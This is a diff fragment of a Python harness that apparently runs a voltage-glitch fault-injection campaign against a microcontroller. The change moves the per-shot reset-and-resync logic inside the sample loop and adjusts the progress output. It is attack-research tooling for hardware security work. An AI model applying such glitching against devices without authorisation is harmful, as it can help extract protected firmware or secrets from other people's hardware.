                     # flatline detector: a firing crowbar disturbs ~5% of
                     # shots at these strengths. Hundreds of clean nacks in
                     # a row = pulses not landing (ghost session
@@ -737,30 +1092,33 @@ def main():
                             os._exit(4)
                     else:
                         _flat[0] = 0
-                if verdict in ('dead', 'ACK_NO_DATA', 'weird', 'zombie', 'spam'):
-                    print(f'  [{verdict}] ext={ext * 1e6 / CLKGEN:6.1f}us '
-                          f'rep={repeat} {note} -> resync', flush=True)
-                    try:
-                        ok = boot_and_sync(fast=True) or boot_and_sync(fast=False)
-                    except Exception:
-                        ok = False
-                    if not ok:
-                        if not reconnect():
-                            teardown(); sys.exit('target/rig lost after resync')
-                # 1-shot-per-boot (Kesenheimer methodology, 2026-10-29):
-                # reset + fresh sync every N shots REGARDLESS of verdict -
-                # flips may be reset-conditioned (boot-to-boot HSI
-                # alignment). Their rig does exactly this every shot.
-                elif RESET_EVERY and shot % RESET_EVERY == 0:
-                    try:
-                        ok = boot_and_sync(fast=True) or boot_and_sync(fast=False)
-                    except Exception:
-                        ok = False
-                    print('  [rst]', flush=True) if ok else None
-                    if not ok:
-                        if not reconnect():
-                            teardown()
-                            sys.exit('target/rig lost in reset-per-shot')
+                    if verdict in ('dead', 'ACK_NO_DATA', 'weird', 'zombie', 'spam'):
+                        print(f'  [{verdict}] ext={ext * 1e6 / CLKGEN:6.1f}us '
+                              f'rep={repeat} {note} -> resync', flush=True)
+                        try:
+                            ok = boot_and_sync(fast=True) or boot_and_sync(fast=False)
+                        except Exception:
+                            ok = False
+                        if not ok:
+                            if not reconnect():
+                                teardown(); sys.exit('target/rig lost after resync')
+                    # 1-shot-per-boot (Kesenheimer methodology, 2026-10-29):
+                    # reset + fresh sync every N shots REGARDLESS of verdict -
+                    # flips may be reset-conditioned (boot-to-boot HSI
+                    # alignment). Their rig does exactly this every shot.
+                    # (INSIDE the sample loop - bug 2026-10-29: was one level
+                    # out, fired once per grid point instead of per shot)
+                    elif RESET_EVERY and shot % RESET_EVERY == 0:
+                        try:
+                            ok = boot_and_sync(fast=True) or boot_and_sync(fast=False)
+                        except Exception:
+                            ok = False
+                        print('  [rst ok]' if ok else '  [rst FAIL -> reconnect]',
+                              flush=True)
+                        if not ok:
+                            if not reconnect():
+                                teardown()
+                                sys.exit('target/rig lost in reset-per-shot')
                 time.sleep(COOLDOWN)
                 if shot % REST_EVERY == 0:
                     print(f'  [{datetime.now():%m-%d %H:%M:%S}] '
@@ -772,7 +1130,7 @@ def main():
                     t_us = ext * 1e6 / CLKGEN          # us after TIO3 edge
                     _pct = 100.0 * shot / total_shots if total_shots else 0.0
                     print(f'  [{datetime.now():%m-%d %H:%M:%S}] '
-                          f'{shot} shots ({_pct:.0f}% of run), {rate:.1f}/s | chunks '
+                          f'{shot} shots ({_pct:.2f}% of run), {rate:.1f}/s | chunks '
                           f'{len(DONE)}/{len(TARGETS)} | '
                           f'glitch time = {t_us + 8.7:.1f}us after 0x11 '
                           f'(ext {ext}, TIO3+{t_us:.1f}us) '
